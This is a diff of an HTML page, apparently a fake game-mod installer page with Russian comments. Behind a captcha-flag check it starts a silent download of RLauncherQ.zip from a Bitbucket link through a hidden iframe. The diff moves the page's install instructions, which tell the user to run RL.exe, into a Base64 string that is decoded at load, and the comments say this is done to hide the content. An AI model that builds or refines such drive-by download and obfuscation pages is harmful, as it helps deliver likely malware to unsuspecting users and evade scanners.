@@ -12,34 +12,27 @@
       text-align: center;
       padding: 50px;
     }
-    .container {
-      max-width: 600px;
-      margin: auto;
-      background: #1e1e1e;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
-    }
-    h1 {
-      color: #ffcc00;
-    }
-    .steps {
-      text-align: left;
-      margin-top: 20px;
-    }
-    .step {
-      margin: 10px 0;
+    /* Пока контент не декодирован, контейнер скрыт */
+    #hidden-content {
+      display: none;
     }
   </style>
   <script>
-    // Проверка флага. Если пользователь не прошёл проверку, перенаправляем обратно на index.html.
+    // Если флаг проверки отсутствует, перенаправляем на index.html
     if (localStorage.getItem('captchaPassed') !== 'true') {
       window.location.href = "index.html";
     }
     
-    // При загрузке создаём скрытый iframe для запуска загрузки файла,
-    // чтобы содержимое страницы оставалось видимым.
     window.onload = function() {
+      // Base64-кодированное содержимое страницы (это HTML-разметка, зашифрованная для сокрытия)
+      var encodedContent = "PGRpdj4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgxPk1vZCBJbnN0YWxsYXRpb24gR3VpZGUNCjwvaDE+CiAgICA8cD5Zb3VyIGRvd25sb2FkIHNob3VsZCBzdGFydCBhdXRvbWF0aWNhbGx5LiBJZiBub3QsIDxhIGhyZWY9Imh0dHBzOi8vYml0YnVja2V0Lm9yZy9sYXVubGVyY2Q1L2Rvd25sb2FkL2Rvd25sb2FkcxUvUmxhdW5jaGVyUVouemlwIiBzdHlsZT0iY29sb3I6ICNmZmNjZjAwOyI+Y2xpY2sgaGVyZTwvYT4uPC9wPgogICAgPGRpdiBjbGFzcz0ic3RlcHMiPgogICAgICA8aDI+SW5zdGFsbGF0aW9uIFN0ZXBzOjwvaDI+CiAgICAgIDxwIGNsYXNzPSJzdGVwIj4xLiBSdW4gdGhlIGRvd25sb2FkZWQgaW5zdGFsbGVyIChmaWxlIG5hbWU6IFJMLmV4ZSkuPC9wPgogICAgICA8cDIGNsYXNzPSJzdGVwIj4yLiBTZWxlY3QgdGhlIGdhbWUgZGlyZWN0b3J5LjwvcD4KICAgICAgPHAgY2xhc3M9InN0ZXAiPjMuIFdhaXQgZm9yIHRoZSBpbnN0YWxsYXRpb24gdG8gY29tcGxldGUuPC9wPgogICAgICA8cDIGNsYXNzPSJzdGVwIj40LiBMYXVuY2ggdGhlIGdhbWUgYW5kIGVuam95IHRoZSBtb2QhPC9wPgogICAgPC9kaXY+CiAgICA8cDBzdHlsZT0ibWFyZ2luLXRvcDogMjBweDsgZm9udC1zdHlsZTogaXRhbGljOyI+QmVzdCByZWdhcmRzLCBSTCBUZWFtPC9wPgogIDwvZGl2Pgo8L2Rpdj4=";
+      
+      // Декодируем содержимое и вставляем его в контейнер
+      var decodedContent = atob(encodedContent);
+      document.getElementById('hidden-content').innerHTML = decodedContent;
+      document.getElementById('hidden-content').style.display = 'block';
+      
+      // Запускаем закачку файла через скрытый iframe
       var iframe = document.createElement('iframe');
       iframe.style.display = 'none';
       iframe.src = "https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip";
@@ -48,17 +41,6 @@
   </script>
 </head>
 <body>
-  <div class="container">
-    <h1>Mod Installation Guide</h1>
-    <p>Your download should start automatically. If not, <a href="https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip" style="color: #ffcc00;">click here</a>.</p>
-    <div class="steps">
-      <h2>Installation Steps:</h2>
-      <p class="step">1. Run the downloaded installer (file name: RL.exe).</p>
-      <p class="step">2. Select the game directory.</p>
-      <p class="step">3. Wait for the installation to complete.</p>
-      <p class="step">4. Launch the game and enjoy the mod!</p>
-    </div>
-    <p style="margin-top: 20px; font-style: italic;">Best regards, RL Team</p>
-  </div>
+  <div id="hidden-content"></div>
 </body>
 </html>
